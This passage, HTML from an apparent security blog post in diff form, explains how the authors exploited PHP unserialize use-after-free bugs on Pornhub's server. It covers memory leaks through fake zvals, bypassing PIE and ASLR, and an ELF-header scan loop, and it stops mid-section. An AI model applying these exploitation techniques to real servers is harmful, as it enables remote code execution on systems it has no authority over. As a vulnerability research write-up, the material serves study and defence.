+<li style="text-align: justify;"><a href="https://bugs.php.net/bug.php?id=72433" target="_blank">PHP Bug &#8211; ID 72433</a> &#8211; <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5771" target="_blank">CVE-2016-5771</a></li>
+<li style="text-align: justify;"><a href="https://bugs.php.net/bug.php?id=72434" target="_blank">PHP Bug &#8211; ID 72434</a> &#8211; <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5773" target="_blank">CVE-2016-5773</a></li>
+</ul>
+<p style="text-align: justify;">The high sophistication of the found PHP bugs and their discovery made it necessary to write separate articles. You can read more details in Dario&#8217;s <a href="https://www.evonide.com/fuzzing-unserialize" target="_blank">fuzzing unserialize write-up</a>.</p>
+<p style="text-align: justify;">In addition, we have written an article about <a href="https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/" target="_blank">Breaking PHP’s Garbage Collection and Unserialize</a>.</p>
+<h3 style="text-align: justify;"><span id="Exploitation">Exploitation</span></h3>
+<p style="text-align: justify;">Even this promising use-after-free vulnerability was considerably difficult to exploit. In particular, it involved multiple exploitation stages.<br />
+Since our main goal was to execute arbitrary code we needed to somehow compromise the CPU&#8217;s instruction pointer referred to as RIP on x86_64. This usually involves the following obstacles:</p>
+<ol>
+<li style="text-align: justify;">The stack and heap (which also include any potential user-input) as well as any other writable segments are flagged non-executable (c.f. <a href="https://en.wikipedia.org/wiki/Executable_space_protection" target="_blank">Executable space protection</a>).</li>
+<li style="text-align: justify;">Even if you are able to control the instruction pointer you need to know what you want to execute i.e. you need to have a valid address of an executable memory segment. For this it is common to call the libc function <em>system</em> which will execute a shell command. In PHP context it is often enough to execute <em>zend_eval_string</em> which usually gets executed e.g. when you write &#8220;eval(&#8216;echo 1337;&#8217;);&#8221; in a PHP script i.e. it allows us to execute arbitrary PHP code without having to transition into other involved libraries.</li>
+</ol>
+<p style="text-align: justify;">The first problem can be overcome by using <a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank">Return-oriented programming</a> (ROP) where you can utilize already existing and executable memory fragments from the binary itself or its libraries. The second problem, however, requires to find the correct address of <em>zend_eval_string</em>. Usually, when a dynamically linked program gets executed the loader will map the process to <span class="st">0x400000 which is the standard load address on x86_64. In case you somehow already obtained the correct PHP executable (e.g. by finding the exact package that is shipped by the target) you can just locally lookup the offset for any function you want<em>. </em></span>We discovered that Pornhub was using a customly compiled version of php5-cgi, therefore making it difficult to determine the exact PHP version as well as getting any information at all about the memory layout of the whole PHP process.</p>
+<h4 style="text-align: justify;"><span id="Leaking_the_PHP_binary_and_required_pointers">Leaking the PHP binary and required pointers</span></h4>
+<p style="text-align: justify;">Exploiting use-after-frees in PHP usually follows the same rules. As soon as you&#8217;re able to fill freed memory that later on gets reused as an internal PHP variable &#8212; so called zvals &#8212; you can generate vectors that allow reading from arbitrary memory as well as triggering code execution.</p>
+<h5><span id="Preparing_thememory_disclosure">Preparing the memory disclosure</span></h5>
+<p style="text-align: justify;">As previously mentioned we were required to obtain more information about Pornhub&#8217;s PHP binary. Therefore, the first step was to abuse the use-after-free to inject a zval that represents a PHP string. The definition of the zval structure looks like the following for PHP 5.6:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500d9021359425" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+"Zend/zend.h"
+[...]
+struct _zval_struct {
+    zvalue_value value;       /* value */
+    zend_uint refcount__gc;
+    zend_uchar type;          /* active type */
+    zend_uchar is_ref__gc;
+};</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500d9021359425-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500d9021359425-2">2</div><div class="crayon-num" data-line="crayon-59661681500d9021359425-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500d9021359425-4">4</div><div class="crayon-num" data-line="crayon-59661681500d9021359425-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500d9021359425-6">6</div><div class="crayon-num" data-line="crayon-59661681500d9021359425-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500d9021359425-8">8</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500d9021359425-1"><span class="crayon-s">"Zend/zend.h"</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500d9021359425-2"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-59661681500d9021359425-3"><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e">_zval_struct</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500d9021359425-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zvalue_value </span><span class="crayon-v">value</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-c">/* value */</span></div><div class="crayon-line" id="crayon-59661681500d9021359425-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zend_uint </span><span class="crayon-v">refcount__gc</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500d9021359425-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zend_uchar </span><span class="crayon-v">type</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">/* active type */</span></div><div class="crayon-line" id="crayon-59661681500d9021359425-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zend_uchar </span><span class="crayon-v">is_ref__gc</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500d9021359425-8"><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0002 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">Whereas the <em>zvalue_value</em> field is defined as a <em>union</em>, hence making type juggling (and type confusions) easily possible.</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500db343718088" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+"Zend/zend.h"
+[...]
+typedef union _zvalue_value {
+    long lval;          /* long value */
+    double dval;        /* double value */
+    struct {
+        char *val;
+        int len;
+    } str;
+    HashTable *ht;      /* hash table value */
+    zend_object_value obj;
+    zend_ast *ast;
+} zvalue_value;</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500db343718088-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500db343718088-2">2</div><div class="crayon-num" data-line="crayon-59661681500db343718088-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500db343718088-4">4</div><div class="crayon-num" data-line="crayon-59661681500db343718088-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500db343718088-6">6</div><div class="crayon-num" data-line="crayon-59661681500db343718088-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500db343718088-8">8</div><div class="crayon-num" data-line="crayon-59661681500db343718088-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500db343718088-10">10</div><div class="crayon-num" data-line="crayon-59661681500db343718088-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500db343718088-12">12</div><div class="crayon-num" data-line="crayon-59661681500db343718088-13">13</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500db343718088-1"><span class="crayon-s">"Zend/zend.h"</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500db343718088-2"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-59661681500db343718088-3"><span class="crayon-r">typedef</span><span class="crayon-h"> </span><span class="crayon-e">union</span><span class="crayon-h"> </span><span class="crayon-e">_zvalue_value</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500db343718088-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">long</span><span class="crayon-h"> </span><span class="crayon-v">lval</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">/* long value */</span></div><div class="crayon-line" id="crayon-59661681500db343718088-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">double</span><span class="crayon-h"> </span><span class="crayon-v">dval</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">/* double value */</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500db343718088-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-59661681500db343718088-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">char</span><span class="crayon-h"> </span><span class="crayon-o">*</span><span class="crayon-v">val</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500db343718088-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">len</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-59661681500db343718088-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-v">str</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500db343718088-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e ">HashTable *</span><span class="crayon-v">ht</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">/* hash table value */</span></div><div class="crayon-line" id="crayon-59661681500db343718088-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">zend_object_value </span><span class="crayon-v">obj</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500db343718088-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e ">zend_ast *</span><span class="crayon-v">ast</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-59661681500db343718088-13"><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-v">zvalue_value</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0004 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">A PHP variable of type string is a zval of type 6. Consequently, it treats the union as a structure that contains a char pointer and a length field. So crafting a string zval with an arbitrary starting point and arbitrary length creates a powerful infoleak that gets triggered when Pornhub&#8217;s setcookie() reflects the injected zval in the response header.</p>
+<p>&nbsp;</p>
+<h5><span id="Finding_PHP8217s_image_base">Finding PHP&#8217;s image base</span></h5>
+<p style="text-align: justify;">Usually, one can start by leaking the binary, which as stated before, begins at 0x400000. Unfortunately, Pornhub&#8217;s server used protection mechanisms like <a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank">PIE</a> and <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank">ASLR</a> which randomize the image base of the process and its shared libraries. This also has become the default as more and more distributions ship packages that enable position independent code.</p>
+<p style="text-align: justify;">The next challenge was on: finding the correct loading address of the binary.</p>
+<p>&nbsp;</p>
+<p style="text-align: justify;">The first difficulty was to somehow obtain a single valid address we could start leaking from. Here it was helpful to know some details about PHP&#8217;s internal memory management. In particular, once a zval is freed PHP will overwrite its first eight bytes with an address to the previously freed chunk. Hence, a trick to obtain a first valid address is to create an integer zval, free this integer zval and finally use a dangling pointer to this zval to obtain its current value.</p>
+<p style="text-align: justify;">Since php-cgi implements multiple workers that simply get forked from a master process, the memory layout never really changes between different requests, as long as you keep sending data of the same size. That&#8217;s also why we could send request after request, each time leaking a different portion of memory by letting the fake zval string begin at different addresses. However, obtaining the heap address of a freed chunk is by its own right not enough to get any clues about the executable location. This is due to a lack of any useful information in the surroundings of that chunk.</p>
+<p>&nbsp;</p>
+<p style="text-align: justify;">To get interesting addresses, there is a relatively complicated technique which requires multiple frees and allocations of PHP structures during the unserialization process (c.f. <a href="https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf" target="_blank">ROP in PHP applications</a> Slide 67). Due to the nature of our bug and to keep the complexity as low as possible we have used our own trick.</p>
+<p style="text-align: justify;">By using a serialized string like &#8220;i:0;a:0:{}i:0;a:0:{}[&#8230;]i:0;a:0:{}&#8221; as part of our overall unserialize payload we could force unserialize to create many empty arrays and free them once it terminated. When initializing an array PHP consecutively allocates memory for its zval and hashtable. One default hashtable entry for empty arrays is the <em>uninitialized_bucket</em> symbol. Overall, we were able to obtain a memory fragment that looked similar to the following:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500e0831772203" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+0x7ffff7fc2fe0: 0x0000000000000000 0x0000000000eae040
+[...]
+0x7ffff7fc3010: 0x00007ffff7fc2b40 0x0000000000000000
+0x7ffff7fc3020: 0x0000000100000000 0x0000000000000000
+0x7ffff7fc3030: # &lt;--------- This address was leaked in a previous request.
+0x7ffff7fc3040: 0x00007ffff7fc2f48 0x0000000000000000
+0x7ffff7fc3050: 0x0000000000000000 0x0000000000000000
+[...]
+0x7ffff7fc30a0: 0x0000000000eae040 0x00000000006d5820
+(gdb) x/xg 0x0000000000eae040
+0xeae040 &lt;uninitialized_bucket&gt;: 0x0000000000000000</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500e0831772203-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500e0831772203-2">2</div><div class="crayon-num" data-line="crayon-59661681500e0831772203-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500e0831772203-4">4</div><div class="crayon-num" data-line="crayon-59661681500e0831772203-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500e0831772203-6">6</div><div class="crayon-num" data-line="crayon-59661681500e0831772203-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500e0831772203-8">8</div><div class="crayon-num" data-line="crayon-59661681500e0831772203-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500e0831772203-10">10</div><div class="crayon-num" data-line="crayon-59661681500e0831772203-11">11</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500e0831772203-1"><span class="crayon-cn">0x7ffff7fc2fe0</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x0000000000000000</span><span class="crayon-h"> </span><span class="crayon-cn">0x0000000000eae040</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500e0831772203-2"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-59661681500e0831772203-3"><span class="crayon-cn">0x7ffff7fc3010</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x00007ffff7fc2b40</span><span class="crayon-h"> </span><span class="crayon-cn">0x0000000000000000</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500e0831772203-4"><span class="crayon-cn">0x7ffff7fc3020</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x0000000100000000</span><span class="crayon-h"> </span><span class="crayon-cn">0x0000000000000000</span></div><div class="crayon-line" id="crayon-59661681500e0831772203-5"><span class="crayon-cn">0x7ffff7fc3030</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-p"># &lt;--------- This address was leaked in a previous request.</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500e0831772203-6"><span class="crayon-cn">0x7ffff7fc3040</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x00007ffff7fc2f48</span><span class="crayon-h"> </span><span class="crayon-cn">0x0000000000000000</span></div><div class="crayon-line" id="crayon-59661681500e0831772203-7"><span class="crayon-cn">0x7ffff7fc3050</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x0000000000000000</span><span class="crayon-h"> </span><span class="crayon-cn">0x0000000000000000</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500e0831772203-8"><span class="crayon-sy">[</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-59661681500e0831772203-9"><span class="crayon-cn">0x7ffff7fc30a0</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x0000000000eae040</span><span class="crayon-h"> </span><span class="crayon-cn">0x00000000006d5820</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500e0831772203-10"><span class="crayon-sy">(</span><span class="crayon-v">gdb</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">x</span><span class="crayon-o">/</span><span class="crayon-i">xg</span><span class="crayon-h"> </span><span class="crayon-cn">0x0000000000eae040</span></div><div class="crayon-line" id="crayon-59661681500e0831772203-11"><span class="crayon-cn">0xeae040</span><span class="crayon-h"> </span><span class="crayon-o">&lt;</span><span class="crayon-v">uninitialized_bucket</span><span class="crayon-o">&gt;</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">0x0000000000000000</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0003 seconds] -->
+<p>&nbsp;</p>
+<p style="text-align: justify;">The address 0xeae040 is PHP&#8217;s <em>uninitialized_bucket</em> symbol address and directly points into PHP&#8217;s <a href="https://en.wikipedia.org/wiki/.bss" target="_blank">BSS segment</a>. You can see that it occurs multiple times in the neighborhood of the lastly freed chunk. As stated before, many empty arrays were freed. Thus, by abusing the circumstance that some hashtable entries remained unchanged in the heap we were able to leak this specific symbol.</p>
+<p style="text-align: justify;">Finally, we could apply a page-wise backwards scan starting from the <em>uninitialized_bucket</em> symbol address to find the <a href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format" target="_blank">ELF header</a>:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500e3162709316" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+$start &amp;= 0xfffffffffffff000;
+$pages += 0x1000 while leak($start - $pages, 4) !~ /^\x7fELF/;
+return $start - $pages;</textarea></div>
+			<div class="crayon-main" style=" max-width: 604px;">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-59661681500e3162709316-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-59661681500e3162709316-2">2</div><div class="crayon-num" data-line="crayon-59661681500e3162709316-3">3</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-59661681500e3162709316-1"><span class="crayon-v">$start</span><span class="crayon-h"> </span><span class="crayon-o">&amp;=</span><span class="crayon-h"> </span>0xfffffffffffff000<span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-59661681500e3162709316-2"><span class="crayon-v">$pages</span><span class="crayon-h"> </span><span class="crayon-o">+=</span><span class="crayon-h"> </span>0x1000<span class="crayon-h"> </span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-e">leak</span><span class="crayon-sy">(</span><span class="crayon-v">$start</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">$pages</span><span class="crayon-sy">,</span><span class="crayon-h"> </span>4<span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-o">~</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-o">^</span><span class="crayon-sy">\</span><span class="crayon-cn">x7fELF</span><span class="crayon-o">/</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-59661681500e3162709316-3"><span class="crayon-r">return</span><span class="crayon-h"> </span><span class="crayon-v">$start</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">$pages</span><span class="crayon-sy">;</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0002 seconds] -->
+<p>&nbsp;</p>
+<h5><span id="Leaking_interesting_PHP_binary_segments">Leaking interesting PHP binary segments</span></h5>
+<p style="text-align: justify;">At this point our situation further complicated things as we were only able to leak 1 KB of data per request (this is due to enforced header size limitations by Pornhub&#8217;s web server). A PHP binary can take up to about 30 MB of size. Assuming one request per second the leaking would have taken about 8 hours and 20 minutes to complete. As we were afraid that our exploitation process could get interrupted at any time it was essential to act as fast and as stealthy as possible. This is why we were required to implement some heuristics to guess/filter likely interesting sections in advance. Nevertheless, we could resolve any structure that was referenced in the ELF&#8217;s string and symbol table. There are other techniques like <a href="http://www.phrack.com/issues/58/4.html" target="_blank">ret2dlresolve</a> that allow omitting the whole leaking process, but they weren&#8217;t entirely applicable here since they require crafting more data structures and require knowledge about different memory locations.</p>
+<p>&nbsp;</p>
+<p style="text-align: justify;">To get the address of <em>zend_eval_string</em> you&#8217;d first have to find the ELF program headers which are at offset 32, then scan forward until you find a program header entry of type 2 (<em>PT_DYNAMIC</em>) to get the ELF&#8217;s dynamic section. This section finally contains a reference to the string and symbol table (type 5 and 6) which you can completely dump by using their size fields and grab any function whose virtual address you desire. Alternatively, you can also use the hashtable (<em>DT_HASH</em>) to find functions more quickly, but in this scenario it doesn&#8217;t matter much since you can quickly traverse the tables locally anyway. In addition to <em>zend_eval_string</em> we were interested in further symbols and the location of our POST variables (because they were supposed to be used as a ROP stack later on).</p>
+<h5><span id="Leaking_the_address_of_our_POSTdata">Leaking the address of our POST data</span></h5>
+<p style="text-align: justify;">To get the address of the supplied POST data you can just leak some more pointers by reading from:</p>
+<p>&nbsp;</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-59661681500e7669281600" class="crayon-syntax crayon-theme-bncplus-modified crayon-font-monospace crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" max-width: 604px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" show" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
